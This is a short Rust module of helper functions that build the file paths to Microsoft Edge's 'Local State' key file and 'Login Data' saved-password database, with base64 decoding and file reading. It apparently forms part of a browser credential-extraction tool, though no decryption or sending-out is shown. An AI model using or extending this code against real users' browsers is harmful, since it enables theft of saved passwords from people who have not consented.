use base64::engine::general_purpose;
use base64::Engine;

use std::fs;

pub const EDGE_STATE_PATH: &str = "\\Microsoft\\Edge\\User Data\\Local State";
pub const EDGE_DB_PATH: &str = "\\Microsoft\\Edge\\User Data\\Default\\Login Data";

pub fn base64_decode(encode_str: &str) -> Result<String, base64::DecodeError>
{
    let decode_bytes = general_purpose::STANDARD.decode(encode_str).unwrap();
    let chars: String = decode_bytes.into_iter().map(|c| c as char).collect();
    Ok(chars)
}

pub fn get_app_data_path() -> Result<String, String>
{
    if let Some(app_data_path) = dirs_2::data_local_dir(){
        if let Some(path_str) = app_data_path.to_str(){
            return Ok(path_str.to_string());
        }else{
            return Err("Path conversion error".to_string());
        }
    }else{
        return Err("Local Data directory path not found".to_string());
    }
}

pub fn get_local_state_path() -> Result<String, String>
{
    let app_data_path = get_app_data_path()?;
    let local_state_path = app_data_path + EDGE_STATE_PATH;
    Ok(local_state_path)
}

pub fn get_db_path() -> String
{
    match get_app_data_path() {
        Ok(app_data_path) => {
            let db_path = format!("{}{}", app_data_path, EDGE_DB_PATH);
            db_path
        }
        Err(error) => {
            eprintln!("Error: {}", error);
            String::new() // Return an empty string in case of an error
        }
    }
}

pub fn read_file_to_string(file_path: &str) -> Result<String, String>
{
    match fs::read_to_string(file_path) {
        Ok(data) => Ok(data),
        Err(err) => Err(err.to_string()), // Convert std::io::Error to a String
    }
}